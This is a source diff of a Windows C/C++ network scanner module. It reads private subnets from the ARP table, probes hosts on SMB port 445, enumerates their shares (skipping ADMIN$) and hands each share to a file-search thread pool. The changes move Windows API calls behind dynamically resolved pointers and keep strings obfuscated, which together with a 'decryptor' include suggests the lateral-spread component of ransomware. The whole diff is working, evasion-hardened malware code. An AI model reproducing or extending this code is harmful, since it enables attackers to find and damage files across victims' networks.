@@ -1,32 +1,26 @@
-#include <WinSock2.h>
-#include <MSWSock.h>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
+#include "network_scanner.h"
+#include "queue.h"
+#include <iphlpapi.h>
 #include <lmshare.h>
 #include <lm.h>
-#include <iphlpapi.h>
+#include <winnetwk.h>
+#include <icmpapi.h>
 #include <ws2ipdef.h>
 #include <ws2tcpip.h>
 #include <shlwapi.h>
-#include "common.h"
-#include "network_scanner.h"
-#include "queue.h"
-#include "decryptor/threadpool.h"
-
-/*#include "network_scanner.h"
-#include "queue.h"
-
-#include <winnetwk.h>
-#include <icmpapi.h>
-
+#include <MSWSock.h>
 #include "filesystem.h"
-#include "decryptor/threadpool.h"
-*/
-#pragma comment(lib, "Iphlpapi.lib")
-#pragma comment(lib, "Netapi32.lib")
-#pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "ws2_32.lib")
+#include "threadpool.h"
+#include "api.h"
+#include "logs.h"
 
 #define SMB_PORT 445
 #define STOP_MARKER 0xFFFFFFFF
+#pragma comment(lib, "ws2_32.lib")
+
+STATIC struct hostent* g_HostEntry = NULL;
 
 enum COMPLETION_KEYS {
 
@@ -43,9 +37,6 @@ enum STATES {
 	NOT_CONNECTED
 
 };
-
-STATIC struct hostent* g_HostEntry = NULL;
-
 
 #pragma region TYPEDEFS
 
@@ -101,11 +92,11 @@ DWORD GetCurrentIpAddress()
 	CHAR szHostName[256];
 	struct in_addr InAddr;
 
-	if (SOCKET_ERROR == gethostname(szHostName, 256)) {
+	if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) {
 		return 0;
 	}
 
-	g_HostEntry = gethostbyname(szHostName);
+	g_HostEntry = (struct hostent*)pgethostbyname(szHostName);
 	if (!g_HostEntry) {
 		return 0;
 	}
@@ -122,12 +113,12 @@ GetConnectEX()
 	int rc;
 
 	/* Dummy socket needed for WSAIoctl */
-	sock = socket(AF_INET, SOCK_STREAM, 0);
+	sock = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);
 	if (sock == INVALID_SOCKET)
 		return FALSE;
 
 	GUID guid = WSAID_CONNECTEX;
-	rc = WSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,
+	rc = (int)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,
 		&guid, sizeof(guid),
 		&g_ConnectEx, sizeof(g_ConnectEx),
 		&dwBytes, NULL, NULL);
@@ -135,7 +126,7 @@ GetConnectEX()
 	if (rc != 0)
 		return FALSE;
 
-	rc = closesocket(sock);
+	rc =(int) pclosesocket(sock);
 	if (rc != 0)
 		return FALSE;
 
@@ -149,9 +140,12 @@ GetSubnets(__in PSUBNET_LIST SubnetList)
 	ULONG TableSize = 0;
 	PMIB_IPNETTABLE IpNetTable = NULL;
 
-	GetIpNetTable(IpNetTable, &TableSize, FALSE);
+	pGetIpNetTable(IpNetTable, &TableSize, FALSE);
 	if (!TableSize) {
+
+		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());
 		return FALSE;
+
 	}
 
 	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);
@@ -159,9 +153,10 @@ GetSubnets(__in PSUBNET_LIST SubnetList)
 		return FALSE;
 	}
 
-	ULONG Result = GetIpNetTable(IpNetTable, &TableSize, FALSE);
+	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &TableSize, FALSE);
 	if (Result != ERROR_SUCCESS) {
 		
+		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());
 		m_free(IpNetTable);
 		return FALSE;
 
@@ -181,10 +176,10 @@ GetSubnets(__in PSUBNET_LIST SubnetList)
 		PCHAR szIpAddress = inet_ntoa(InAddr);
 		DWORD le = WSAGetLastError();
 
-		PCSTR p1 = StrStrIA(szIpAddress, OBFA("172."));
-		PCSTR p2 = StrStrIA(szIpAddress, OBFA("192.168."));
-		PCSTR p3 = StrStrIA(szIpAddress, OBFA("10."));
-		PCSTR p4 = StrStrIA(szIpAddress, OBFA("169."));
+		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA("172."));
+		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA("192.168."));
+		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA("10."));
+		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA("169."));
 
 		if (p1 == szIpAddress ||
 			p2 == szIpAddress ||
@@ -241,7 +236,7 @@ network_scanner::EnumShares(
 
 	do
 	{
-		Result = NetShareEnum(pwszIpAddress, 1, (LPBYTE*)&ShareInfoBuffer, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
+		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, 1, (LPBYTE*)&ShareInfoBuffer, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
 		if (Result == ERROR_SUCCESS)
 		{
 
@@ -257,14 +252,14 @@ network_scanner::EnumShares(
 
 					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO));
 					
-					if (ShareInfo)
-					{
+					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {
 
-						lstrcpyW(ShareInfo->wszSharePath, OBFW(L"\\\\"));
-						lstrcatW(ShareInfo->wszSharePath, pwszIpAddress);
-						lstrcatW(ShareInfo->wszSharePath, OBFW(L"\\"));
-						lstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);
+						plstrcpyW(ShareInfo->wszSharePath, OBFW(L"\\\\"));
+						plstrcatW(ShareInfo->wszSharePath, pwszIpAddress);
+						plstrcatW(ShareInfo->wszSharePath, OBFW(L"\\"));
+						plstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);
 
+						logs::Write(OBFW(L"Found share %s."), ShareInfo->wszSharePath);
 						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);
 
 					}
@@ -275,7 +270,7 @@ network_scanner::EnumShares(
 
 			}
 
-			NetApiBufferFree(ShareInfoBuffer);
+			pNetApiBufferFree(ShareInfoBuffer);
 		}
 
 	} while (Result == ERROR_MORE_DATA);
@@ -292,24 +287,24 @@ HostHandler(__in PVOID pArg)
 
 	while (TRUE) {
 
-		EnterCriticalSection(&g_CriticalSection);
+		pEnterCriticalSection(&g_CriticalSection);
 
 		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);
 		if (HostInfo == NULL) {
 
-			LeaveCriticalSection(&g_CriticalSection);
-			Sleep(1000);
+			pLeaveCriticalSection(&g_CriticalSection);
+			pSleep(1000);
 			continue;
 
 		}
 
 		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);
-		LeaveCriticalSection(&g_CriticalSection);
+		pLeaveCriticalSection(&g_CriticalSection);
 
 		if (HostInfo->dwAddres == STOP_MARKER) {
 
 			m_free(HostInfo);
-			ExitThread(EXIT_SUCCESS);
+			pExitThread(EXIT_SUCCESS);
 
 		}
 
@@ -318,23 +313,25 @@ HostHandler(__in PVOID pArg)
 		{
 
 			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&ShareList);
+			logs::Write(OBFW(L"Starting search on share %s."), ShareInfo->wszSharePath);
 			filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
 			TAILQ_REMOVE(&ShareList, ShareInfo, Entries);
 			m_free(ShareInfo);
 
 		}
+
 		m_free(HostInfo);
 
 	}
 
-	ExitThread(EXIT_SUCCESS);
+	pExitThread(EXIT_SUCCESS);
 }
 
 STATIC
 BOOL
 AddHost(
 	__in DWORD dwAddres
-	)
+)
 {
 	if (g_HostEntry) {
 		INT i = 0;
@@ -357,10 +354,11 @@ AddHost(
 	temp.sin_port = 0;
 	temp.sin_family = AF_INET;
 	HostInfo->dwAddres = dwAddres;
-	
+
 	if (dwAddres != STOP_MARKER) {
 
-		if (SOCKET_ERROR == WSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {
+
+		if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {
 
 			m_free(HostInfo);
 			return FALSE;
@@ -369,12 +367,12 @@ AddHost(
 
 	}
 
-	EnterCriticalSection(&g_CriticalSection); {
+	pEnterCriticalSection(&g_CriticalSection); {
 
 		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);
-		
+
 	}
-	LeaveCriticalSection(&g_CriticalSection);
+	pLeaveCriticalSection(&g_CriticalSection);
 	return TRUE;
 }
 
@@ -396,17 +394,17 @@ CreateHostTable()
 		bAddres[3] = i;
 		RtlCopyMemory(&dwAddress, bAddres, 4);
 
-		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)GlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT));
+		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT));
 		if (!ConnectCtx) {
 			break;
 		}
 
 		ConnectCtx->dwAddres = dwAddress;
 		ConnectCtx->State = NOT_CONNECTED;
-		ConnectCtx->s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
+		ConnectCtx->s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
 		if (ConnectCtx->s == INVALID_SOCKET) {
 
-			GlobalFree(ConnectCtx);
+			pGlobalFree(ConnectCtx);
 			continue;
 
 		}
@@ -417,18 +415,18 @@ CreateHostTable()
 		SockAddr.sin_port = 0;
 		SockAddr.sin_addr.s_addr = INADDR_ANY;
 
-		if (bind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {
+		if (pbind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {
 
-			closesocket(ConnectCtx->s);
-			GlobalFree(ConnectCtx);
+			pclosesocket(ConnectCtx->s);
+			pGlobalFree(ConnectCtx);
 			continue;
 
 		}
 
-		if (!CreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {
+		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {
 
-			closesocket(ConnectCtx->s);
-			GlobalFree(ConnectCtx);
+			pclosesocket(ConnectCtx->s);
+			pGlobalFree(ConnectCtx);
 			continue;
 
 		}
@@ -475,13 +473,13 @@ STATIC
 BOOL
 CompleteAsyncConnect(SOCKET s)
 {
-	int Result = setsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0);
+	int Result = (INT)psetsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0);
 	if (Result != ERROR_SUCCESS)
 		return FALSE;
 
 	int Seconds;
 	int Bytes = sizeof(Seconds);
-	Result = getsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, (char*)&Seconds, (PINT)&Bytes);
+	Result = (INT)pgetsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, (char*)&Seconds, (PINT)&Bytes);
 	if (Result != ERROR_SUCCESS)
 		return FALSE;
 
@@ -495,7 +493,7 @@ STATIC
 VOID
 WINAPI
 TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {
-	PostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);
+	pPostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);
 }
 
 STATIC
@@ -507,9 +505,9 @@ PortScanHandler(PVOID pArg)
 	HANDLE hTimer = NULL;
 	BOOL IsTimerActivated = FALSE;
 
-	HANDLE hTimerQueue = CreateTimerQueue();
+	HANDLE hTimerQueue = pCreateTimerQueue();
 	if (!hTimerQueue) {
-		ExitThread(EXIT_FAILURE);
+		pExitThread(EXIT_FAILURE);
 	}
 
 	while (TRUE) {
@@ -518,7 +516,7 @@ PortScanHandler(PVOID pArg)
 		ULONG_PTR CompletionStatus;
 		PCONNECT_CONTEXT ConnectContext;
 
-		BOOL Success = GetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);
+		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);
 
 		if (CompletionStatus == START_COMPLETION_KEY) {
 			
@@ -528,8 +526,8 @@ PortScanHandler(PVOID pArg)
 
 			ScanHosts();
 
-			if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
-				ExitThread(EXIT_FAILURE);
+			if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
+				pExitThread(EXIT_FAILURE);
 			}
 
 			IsTimerActivated = FALSE;
@@ -554,10 +552,10 @@ PortScanHandler(PVOID pArg)
 				while (!TAILQ_EMPTY(&g_ConnectionList)) {
 
 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
-					shutdown(ConnectCtx->s, SD_SEND);
-					closesocket(ConnectCtx->s);
+					pshutdown(ConnectCtx->s, SD_SEND);
+					pclosesocket(ConnectCtx->s);
 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
-					GlobalFree(ConnectCtx);
+					pGlobalFree(ConnectCtx);
 
 				}
 
@@ -567,8 +565,8 @@ PortScanHandler(PVOID pArg)
 
 				ScanHosts();
 
-				if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
-					ExitThread(EXIT_FAILURE);
+				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
+					pExitThread(EXIT_FAILURE);
 				}
 
 				IsTimerActivated = FALSE;
@@ -585,7 +583,7 @@ PortScanHandler(PVOID pArg)
 				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {
 
 					if (ConnectCtx->State == CONNECTING) {
-						CancelIo((HANDLE)ConnectCtx->s);
+						pCancelIo((HANDLE)ConnectCtx->s);
 					}
 
 				}
@@ -595,10 +593,10 @@ PortScanHandler(PVOID pArg)
 				while (!TAILQ_EMPTY(&g_ConnectionList)) {
 
 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
-					shutdown(ConnectCtx->s, SD_SEND);
-					closesocket(ConnectCtx->s);
+					pshutdown(ConnectCtx->s, SD_SEND);
+					pclosesocket(ConnectCtx->s);
 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
-					GlobalFree(ConnectCtx);
+					pGlobalFree(ConnectCtx);
 
 				}
 
@@ -608,8 +606,8 @@ PortScanHandler(PVOID pArg)
 
 				ScanHosts();
 
-				if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
-					ExitThread(EXIT_FAILURE);
+				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
+					pExitThread(EXIT_FAILURE);
 				}
 
 				IsTimerActivated = FALSE;
@@ -619,8 +617,9 @@ PortScanHandler(PVOID pArg)
 
 	}
 
-	DeleteTimerQueue(hTimerQueue);
-	ExitThread(EXIT_SUCCESS);
+	pDeleteTimerQueue(hTimerQueue);
+	pExitThread(EXIT_SUCCESS);
+	return EXIT_SUCCESS;
 }
 
 
@@ -632,55 +631,70 @@ network_scanner::StartScan()
 	PSUBNET_INFO SubnetInfo = NULL;
 
 	g_ActiveOperations = 0;
-	WSAStartup(MAKEWORD(2, 2), &WsaData);
-	InitializeCriticalSection(&g_CriticalSection);
+	pWSAStartup(MAKEWORD(2, 2), &WsaData);
+	pInitializeCriticalSection(&g_CriticalSection);
 
 	if (!GetConnectEX()) {
-		goto cleanup;
-	}
 
-	g_IocpHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);
-	if (g_IocpHandle == NULL) {
+		logs::Write(OBFW(L"Can't get ConnectEx."));
 		goto cleanup;
+
 	}
 
 	GetCurrentIpAddress();
+	
+	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);
+	if (g_IocpHandle == NULL) {
+
+		logs::Write(OBFW(L"Can't create io completion port."));
+		goto cleanup;
+
+	}
 
 	TAILQ_INIT(&g_SubnetList);
 	TAILQ_INIT(&g_HostList);
 	TAILQ_INIT(&g_ConnectionList);
 
 	if (!GetSubnets(&g_SubnetList)) {
+
+		logs::Write(OBFW(L"Can't get subnets."));
 		goto cleanup;
+
 	}
 
-	hHostHandler = CreateThread(NULL, 0, &HostHandler, NULL, 0, NULL);
+	hHostHandler = pCreateThread(NULL, 0, &HostHandler, NULL, 0, NULL);
 	if (hHostHandler == INVALID_HANDLE_VALUE) {
+
+		logs::Write(OBFW(L"Can't create host thread."));
 		goto cleanup;
+
 	}
 
-	hPortScan = CreateThread(NULL, 0, &PortScanHandler, NULL, 0, NULL);
+	hPortScan = pCreateThread(NULL, 0, &PortScanHandler, NULL, 0, NULL);
 	if (hPortScan == INVALID_HANDLE_VALUE) {
+
+		logs::Write(OBFW(L"Can't create port scan thread."));
 		goto cleanup;
+
 	}
 
-	PostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);
-	WaitForSingleObject(hPortScan, INFINITE);
+	pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);
+	pWaitForSingleObject(hPortScan, INFINITE);
 
 	AddHost(STOP_MARKER);
-	WaitForSingleObject(hHostHandler, INFINITE);
+	pWaitForSingleObject(hHostHandler, INFINITE);
 
 cleanup:
-	DeleteCriticalSection(&g_CriticalSection);
+	pDeleteCriticalSection(&g_CriticalSection);
 	if (g_IocpHandle) {
-		CloseHandle(g_IocpHandle);
+		pCloseHandle(g_IocpHandle);
 	}
 	if (hHostHandler) {
-		CloseHandle(hHostHandler);
+		pCloseHandle(hHostHandler);
 	}
 	if (hPortScan) {
-		CloseHandle(hPortScan);
+		pCloseHandle(hPortScan);
 	}
 
-	WSACleanup();
+	pWSACleanup();
 }
